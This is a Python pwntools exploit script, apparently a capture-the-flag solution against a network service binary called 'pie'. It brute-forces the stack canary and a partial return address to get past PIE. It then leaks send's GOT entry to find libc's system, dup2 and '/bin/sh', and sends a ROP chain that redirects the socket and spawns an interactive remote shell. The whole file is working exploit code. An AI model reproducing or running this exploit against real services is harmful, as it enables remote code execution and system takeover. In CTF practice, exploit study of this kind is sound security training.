# -*- coding: utf-8 -*-

from pwn import *
from subprocess import check_output


def pidof(name):
    output = check_output(["pidof", name])
    print "[+] pidof %s : %s" % (name, output)
    result = [int(i) for i in output.split(" ")]
    return result
# gdb.attach(
#     pidof(pwnable_filename)[0],
#     gdbscript='b recv\n'
# )

# context.log_level = 0
LOCAL = False

pwnable_filename = "./pie"

libc_filename = "/lib/i386-linux-gnu/libc.so.6"
libc_filename = "./libc.so.6"


def generate_io(local):
    global libc_filename
    if local:
        Io = remote("127.0.0.1", 10007)
        # Io = process(pwnable_filename)
    else:
        Io = remote("192.168.210.11", 10007)
        # libc_filename = "./libc.so.6"
    return Io




pwnable = ELF(pwnable_filename)
libc = ELF(libc_filename)

# 0x0000122a : pop edi ; pop ebp ; ret
pop_pop_ret_offset = 0x0000122a

libc_send_offset = libc.symbols['send']
libc_system_offset = libc.symbols['system']
libc_dup2_offset = libc.symbols['dup2']
libc_bin_sh_offset = next(libc.search("/bin/sh\x00"))

junk_size = 0x40
junk = "A" * junk_size


def crack_cannary(cannary):
    if len(cannary) == 4:
        return cannary
    else:
        context.log_level = 'error'
        for i in range(4 - len(cannary)):
            for j in range(0x100):
                if j == 10:
                    continue
                Io = generate_io(LOCAL)
                Io.read()
                payload = flat([
                    junk,
                    cannary + chr(j),
                ])
                print "[+] Payload: %r" % (payload)
                Io.sendline(payload)
                try:
                    data = Io.read()
                    print data
                    if "See you again!" in data:
                        print("Found!")
                        break
                except Exception:
                    pass
                Io.close()
            cannary += chr(j)
        context.log_level = 'info'
        return cannary


def crack_base_addr_bypass_pie(known, cannary):
    if len(known) == 4:
        return known
    else:
        context.log_level = 'error'
        for i in range(4 - len(known)):
            for j in range(0x100):
                if j == 10:
                    continue
                Io = generate_io(LOCAL)
                Io.read()
                payload = flat([
                    junk,
                    cannary,
                    "A" * 12,
                    known + chr(j)
                ])
                print "[+] Payload: %r" % (payload)
                Io.sendline(payload)
                try:
                    data = Io.read()
                    print data
                    if "Would you like some delicious pie?" in data:
                        print("Found!")
                        break
                except Exception:
                    pass
                Io.close()
            known += chr(j)
        context.log_level = 'info'
        return known


def leak_memory(cannary, binary_base_addr_addr, address, size):
    socket_fd = 4

    output_func_offset = 0x00000E8C
    output_func_addr = output_func_offset + binary_base_addr_addr

    start_offset = 0x000009F0
    start_addr = start_offset + binary_base_addr_addr

    Io = generate_io(LOCAL)
    Io.read()
    payload = flat([
        junk,
        cannary,
        "A" * 0x0C,
        output_func_addr,
        start_addr,
        socket_fd,
        address,
        size
    ])

    # gdb.attach(
    #     pidof(pwnable_filename)[0],
    #     gdbscript='b send\n'
    # )
    print "[+] payload: %r" % (payload)

    Io.sendline(payload)
    return Io.read(size)


# def leak(address):
#     cannary = "\x00\x51\xf7\x48"
#     cannary = crack_cannary(cannary)
#     print "[+] Cannary: 0x%s" % (cannary.encode("hex"))

#     pie_offset = "\x56\x5d\x11\x5d"
#     pie_offset = crack_base_addr_bypass_pie(pie_offset, cannary)
#     print "[+] pie_offset: 0x%s" % (pie_offset.encode("hex"))

#     binary_base_addr_addr = (u32(pie_offset[::-1]) & 0xFFFFF000) - 0x1000
#     print "[+] binary_base_addr_addr: %s" % (
#         hex(binary_base_addr_addr)
#     )
#     size = 4
#     data = leak_memory(cannary, binary_base_addr_addr, address, size)
#     return data

# def leak_binary_base_addr_bypass_pie(cannary):
#     junk_size = 0x40
#     junk = "A" * junk_size
#     Io = generate_io(LOCAL)
#     # Clear buffer
#     # Would you like some delicious pie?
#     Io.readline()
#     # Leak send got
#     payload = flat([
#         junk,
#         cannary,
#         p32(0x5660c000),
#         p32(0x5660c000),
#         "A" * 4,
#         # # partial overwrite
#         "\x64",
#     ])
#     print "[+] Payload: %r" % (payload)
#     Io.sendline(payload)
#     data = Io.read()
#     print "[+] Leak data: %r" % (data)
#     for i in range(0, len(data), 4):
#         base_addr = u32(data[i:i + 4])
#         print "0x%08x" % (base_addr)
#     offset = 25
#     binary_base_addr_addr = data[offset * 4: (offset + 1) * 4]
#     Io.close()
#     return binary_base_addr_addr


def main():
    ########################
    # Step 1. Crack canary #
    ########################

    cannary = "\x00\x7f\x14\x96"
    cannary = crack_cannary(cannary)
    print "[+] Cannary: 0x%s" % (cannary.encode("hex"))

    pie_offset = "]aVV"
    pie_offset = crack_base_addr_bypass_pie(pie_offset, cannary)
    print "[+] pie_offset: 0x%s" % (pie_offset.encode("hex"))

    binary_base_addr_addr = (u32(pie_offset) & 0xFFFFF000) - 0x1000
    print "[+] binary_base_addr_addr: %s" % (
        hex(binary_base_addr_addr)
    )

    # d = DynELF(leak, elf=pwnable, pointer=binary_base_addr_addr)
    # system_addr = d.lookup('system', 'libc')
    # print "[+] system_addr: 0x%08x" % (system_addr)

    #################################
    # Step 2. Leak stack bypass pie #
    #################################
    send_got_addr = pwnable.got['send'] + binary_base_addr_addr

    send_addr = u32(leak_memory(
        cannary,
        binary_base_addr_addr,
        send_got_addr,
        0x04
    ))

    print "[+] send_addr: 0x%08x" % (send_addr)

    # send_offset - system_offset = remote_send_addr - remote_system_addr
    # remote_system_addr = remote_send_addr - send_offset + system_offset
    system_addr = send_addr - libc_send_offset + libc_system_offset
    print "[+] system_addr: 0x%08x" % (system_addr)

    dup2_addr = send_addr - libc_send_offset + libc_dup2_offset
    print "[+] dup2_addr: 0x%08x" % (dup2_addr)

    bin_sh_addr = send_addr - libc_send_offset + libc_bin_sh_offset
    print "[+] bin_sh_addr: 0x%08x" % (bin_sh_addr)

    data = leak_memory(
        cannary,
        binary_base_addr_addr,
        bin_sh_addr,
        0x10
    )
    print "[+] Leak /bin/sh string: %r" % (data)

    #####################
    # Step 3. Get shell #
    #####################
    # Io = generate_io(LOCAL)

    '''
    [+] send_addr: 0xf76263a0
    [+] system_addr: 0xf7578da0
    [+] dup2_addr: 0xf7614310
    [+] bin_sh_addr: 0xf7699a0b
    '''

    # system_addr = 0xf7578da0
    # dup2_addr = 0xf7614310
    # bin_sh_addr = 0xf7699a0b

    pop_pop_ret_addr = pop_pop_ret_offset + binary_base_addr_addr

    stdin = 0
    stdout = 1
    socket_fd = 4

    Io = generate_io(LOCAL)

    payload = flat([
        junk,
        cannary,
        "A" * 4 * 3,
        # dup2(socket_fd, stdin)
        p32(dup2_addr),
        p32(pop_pop_ret_addr),
        p32(socket_fd),
        p32(stdin),
        # dup2(socket_fd, stdout)
        p32(dup2_addr),
        p32(pop_pop_ret_addr),
        p32(socket_fd),
        p32(stdout),
        # system("/bin/sh")
        p32(system_addr),
        p32(0xFFFFFFFF),
        p32(bin_sh_addr),
    ])

    Io.sendline(payload)

    Io.interactive()


if __name__ == '__main__':
    main()
